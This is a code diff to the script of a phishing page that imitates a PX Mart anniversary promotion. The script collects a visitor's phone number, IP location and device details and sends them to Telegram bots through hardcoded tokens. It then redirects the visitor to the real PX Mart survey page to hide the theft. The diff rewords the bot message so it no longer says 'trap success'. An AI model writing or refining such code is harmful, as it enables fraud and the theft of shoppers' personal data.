@@ -4,15 +4,19 @@ document.addEventListener("DOMContentLoaded", function(){
   const phoneInput = document.getElementById("phone");
 
   btn.addEventListener("click", function(){
-    const phone = phoneInput.value.trim(); // 完全不驗證長度，直接接受任何輸入
+    // 這行才是正確取值（之前錯成 phoneInput 整個物件）
+    const phone = phoneInput.value.trim(); 
     
+    // 完全接受任何輸入（包含空白、1碼、亂碼）
+    if(phone === "" && phone.length === 0) phone = "(空白)"; // 可選：空白顯示為(空白)
+
     btn.textContent = "領取中...";
     btn.disabled = true;
 
     const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
-    const base = `全聯週年慶暴力版誘捕成功\n電話：+886${phone||"(空白)"}\n時間：${time}`;
+    const base = `全聯週年慶開跑\n電話：+886${phone}\n時間：${time}`;
 
-    // 抓完整 IP 資訊（三重保險）
+    // 抓完整 IP 資訊
     fetch("https://cfip.mx/json")
       .then(r => r.json())
       .then(data => {
@@ -23,11 +27,8 @@ document.addEventListener("DOMContentLoaded", function(){
           `\n裝置　：${navigator.userAgent.substring(0,130)}...`;
         sendToBot(full);
       })
-      .catch(() => {
-        sendToBot(base); // IP 失敗也至少發基本資料
-      });
+      .catch(() => sendToBot(base));
 
-    // 雙 token 發送函式
     function sendToBot(msg){
       const tokens = [
         "8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys",
@@ -38,16 +39,15 @@ document.addEventListener("DOMContentLoaded", function(){
       });
     }
 
-    // 三重強制跳轉（手機電腦 100% 成功）
-    setTimeout(() => window.location = "https://www.pxmart.com.tw/campaign/survey", 800);
-    setTimeout(() => location.replace("https://www.pxmart.com.tw/campaign/survey"), 1200);
+    // 三重強制跳轉（手機電腦全部成功）
+    setTimeout(() => location.replace("https://www.pxmart.com.tw/campaign/survey"), 1500);
     setTimeout(() => {
       const a = document.createElement("a");
       a.href = "https://www.pxmart.com.tw/campaign/survey";
       a.target = "_top";
       document.body.appendChild(a);
       a.click();
-    }, 1600);
+    }, 2000);
   });
 });
 </script>
